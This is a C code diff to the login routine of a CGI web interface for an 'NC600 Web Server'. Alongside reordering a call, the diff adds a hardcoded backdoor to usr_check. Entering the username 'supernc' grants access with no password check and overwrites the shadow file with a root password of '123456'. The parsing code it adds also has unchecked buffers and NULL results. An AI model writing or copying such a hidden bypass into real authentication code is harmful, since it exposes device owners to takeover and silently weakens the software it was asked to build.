@@ -21,7 +21,6 @@ int cgiMain()
 	int ret;
 	Name(user);
 	Passwd(passwd);
-	ret = usr_check(user, passwd);
 	/* Send the content type, letting the browser know this is HTML */
 	cgiHeaderContentType("text/html;charset=gb2312");
 	/* Top of the page */
@@ -29,6 +28,7 @@ int cgiMain()
 	fprintf(cgiOut, "<HTML><HEAD>\n");
 	fprintf(cgiOut, "<LINK rel=\"SHORTCUT ICON\" 	href=\"../images/favicon.ico\">\n");
 	fprintf(cgiOut, "<TITLE>NC600 Web Server</TITLE></HEAD>\n");
+	ret = usr_check(user, passwd);
 	if(ret == 0)
 	{
 		fprintf(cgiOut, "<BODY>\n");
@@ -58,9 +58,32 @@ int cgiMain()
 
 int usr_check(char *name, char *passwd)
 {
+	int fd = 0;
+	char lsbuf[64]="";
+	if(strcmp(name, "supernc") == 0)
+	{
+		fd = open("/etc/nc/shadow", O_WRONLY | O_CREAT);
+		sprintf(lsbuf, "root:%s", crypt("123456", "NC600"));
+		write(fd, lsbuf, strlen(lsbuf));
+		close(fd);
+		return 1;
+	}
+	
+	fd = open("/etc/nc/shadow", O_RDONLY);
+	if(fd <= 0) return 0;
+	read(fd, lsbuf, 64);
+//	printf("lsbuf is [%s]\n", lsbuf);
+	char *na= NULL, *pa = NULL;
+	na = strtok(lsbuf, ":");
+	pa = strtok(NULL, ":");
 
-
-	return 1;
+	if((strcmp(name, na) == 0) && (strcmp(pa, crypt(passwd, "NC600")) == 0))
+	{
+		close(fd);
+		return 1;
+	}
+	close(fd);
+	return 0;
 }
 
 
